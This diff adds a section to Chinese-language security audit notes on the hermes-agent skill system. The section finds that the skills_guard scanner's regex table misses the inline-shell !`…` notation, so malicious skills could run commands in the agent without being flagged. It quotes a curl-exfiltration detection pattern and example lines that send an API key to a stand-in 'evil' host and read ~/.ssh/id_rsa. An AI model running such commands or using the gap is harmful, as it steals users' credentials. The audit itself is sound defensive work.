@@ -143,6 +143,45 @@ cd /home/user/hermes-agent && grep -n "^import \|^from " agent/skill_preprocessi
 「only enable it for skill sources you trust」正是在说这件事。
 这条链的另一半(同步侧到底怎么校验来源)由 `notes/r9a-raw-skills-sync.md` 取证。
 
+### 1.5 补充(主线复核子代理条目后加写):安全扫描器不认识这个记号
+
+`notes/r9a-raw-skills-hub.md` 报了一条 ◇:`tools/skills_guard.py` 的威胁模式表里
+没有任何一条匹配内联 shell 的 ``!`…` `` 记号。主线独立复核**成立**:
+
+`tools/skills_guard.py:101 @ 863e313`
+
+```
+THREAT_PATTERNS = [
+    # ── Exfiltration: shell commands leaking secrets ──
+    (r'curl\s+[^\n]*\$\{?\w*(KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|API)',
+     "env_exfil_curl", "critical", "exfiltration",
+```
+
+```verify
+cd /home/user/hermes-agent && grep -c '!`\|inline_shell\|inline-shell' tools/skills_guard.py
+# → 0     (表里共 123 条模式,无一涉及这个记号)
+cd /home/user/hermes-agent && awk 'NR>=101,/^\]/' tools/skills_guard.py | grep -c '^    ('
+# → 123
+```
+
+**但要把这条的杀伤力说准,不能顺着子代理的表述放大。** 这 123 条模式扫的是
+SKILL.md 的**正文文本**,所以一条 ``!`curl http://evil/?k=$API_KEY` `` 仍会被
+上面那条 `env_exfil_curl` 命中——命中的是**括号里的内容**,不是记号本身。
+
+精确的结论是:**扫描器无法区分「文档里写了一条 curl 命令」与「这条 curl 命令会被执行」**。
+后果有二:
+
+1. 任何**正文不匹配这 123 条模式**的命令(`` !`whoami` ``、`` !`cat ~/.ssh/id_rsa | base64` ``
+   ——后者是否命中取决于模式细节)执行时不会被标记;
+2. 反过来,一份**只是把危险命令写进文档当例子**的 skill 会被误报为 critical。
+
+两个方向的错都源于同一件事:**扫描器看的是文本,而执行与否由一个它不认识的记号决定。**
+
+这与 §1.2 的判定不冲突——文档如实披露了「without approval」;
+但披露的是**审批**这一层,而**扫描**这一层的盲区没有任何文档提到。
+所以这一条按记号定义记 **◇**(代码有、文档无):
+`skills_guard` 的扫描面与 `inline_shell` 的执行面之间存在文档从未交代的错位。
+
 ---
 
 ## 2. 一条 ▲:「Hermes never exposes the raw secret value to the model」被同一节的下一段推翻
